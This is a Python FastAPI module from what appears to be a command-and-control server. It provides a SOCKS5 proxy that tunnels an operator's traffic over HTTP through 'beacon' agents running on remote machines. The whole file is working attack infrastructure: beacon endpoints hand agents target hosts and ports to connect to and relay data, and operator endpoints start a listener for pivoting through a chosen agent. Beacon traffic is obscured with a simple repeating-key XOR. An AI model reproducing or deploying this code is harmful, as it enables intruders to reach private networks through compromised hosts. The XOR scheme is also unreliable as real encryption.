"""
HTTP-tunnelled SOCKS5 proxy endpoints.

Beacon side:
  POST /api/beacon/tunnel/status  — beacon reports which channels it has open
  POST /api/beacon/tunnel/tick    — beacon sends data from remote, gets data to forward

Operator side:
  POST /api/tunnel/start          — start SOCKS5 listener for an agent
  DELETE /api/tunnel              — stop SOCKS5 listener
  GET  /api/tunnel/status         — get current proxy status + channel list
"""
from fastapi import APIRouter, Depends, HTTPException, Header, Request
from pydantic import BaseModel
from typing import Optional
import base64, json as _json
import socks5_server
from auth import require_auth, User
import config


def _decrypt_body(raw: bytes) -> dict:
    try:
        obj = _json.loads(raw)
        if isinstance(obj, dict) and obj.get("enc") == 1:
            nonce = obj["nonce"]
            data  = bytes.fromhex(obj["data"])
            key   = (config.AGENT_SECRET + nonce).encode()
            plain = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
            return _json.loads(plain)
        return obj
    except Exception:
        return _json.loads(raw)

router = APIRouter(tags=["tunnel"])


def _verify_beacon(x_agent_secret: Optional[str] = Header(None)):
    if x_agent_secret != config.AGENT_SECRET:
        raise HTTPException(403, "Invalid agent secret")


# ── Beacon endpoints ──────────────────────────────────────────────────────────

class TunnelTickItem(BaseModel):
    channel_id: str
    data: str       # base64 data from beacon (empty string = no data)
    closed: bool = False


class TunnelTickReq(BaseModel):
    agent_id: str
    items: list[TunnelTickItem] = []


class TunnelTickRespItem(BaseModel):
    channel_id: str
    data: str       # base64 data to forward to remote
    close: bool = False


@router.post("/api/beacon/tunnel/tick")
async def tunnel_tick(request: Request, _: None = Depends(_verify_beacon)):
    try:
        req = TunnelTickReq(**_decrypt_body(await request.body()))
    except Exception:
        raise HTTPException(422, "Invalid tunnel_tick body")
    # Process incoming data / closures from beacon
    for item in req.items:
        ch = socks5_server.get_channel(item.channel_id)
        if ch:
            if item.closed:
                ch.active = False
                socks5_server.remove_channel(item.channel_id)
            elif item.data:
                decoded = base64.b64decode(item.data)
                ch.write_from_beacon(decoded)

    # Build response: new channels to open + pending data to send
    response_items: list[dict] = []

    # Channels that need to be opened on beacon side
    with socks5_server._channels_lock:
        for ch in list(socks5_server._channels.values()):
            if not ch.active:
                continue
            if not getattr(ch, '_open_sent', False):
                response_items.append({
                    "action": "open",
                    "channel_id": ch.id,
                    "host": ch.target_host,
                    "port": ch.target_port,
                })
                ch._open_sent = True
            else:
                # Send pending data
                data = ch.read_for_beacon()
                if data:
                    response_items.append({
                        "action": "data",
                        "channel_id": ch.id,
                        "data": base64.b64encode(data).decode(),
                    })
                # Close signal
                if not ch.active:
                    response_items.append({
                        "action": "close",
                        "channel_id": ch.id,
                    })

    return {"items": response_items}


# ── Operator endpoints ────────────────────────────────────────────────────────

class StartTunnelReq(BaseModel):
    agent_id: str
    bind_port: int = 1080


@router.post("/api/tunnel/start")
def start_tunnel(req: StartTunnelReq, _: User = Depends(require_auth)):
    try:
        socks5_server.start(req.agent_id, bind_port=req.bind_port)
    except OSError as e:
        raise HTTPException(400, f"Cannot bind port {req.bind_port}: {e}")
    return {
        "ok": True,
        "agent_id": req.agent_id,
        "port": socks5_server.current_port(),
    }


@router.delete("/api/tunnel")
def stop_tunnel(_: User = Depends(require_auth)):
    socks5_server.stop()
    return {"ok": True}


@router.get("/api/tunnel/status")
def tunnel_status(_: User = Depends(require_auth)):
    return {
        "running": socks5_server.is_running(),
        "port": socks5_server.current_port(),
        "agent_id": socks5_server._current_agent_id,
        "channels": socks5_server.list_channels(),
    }
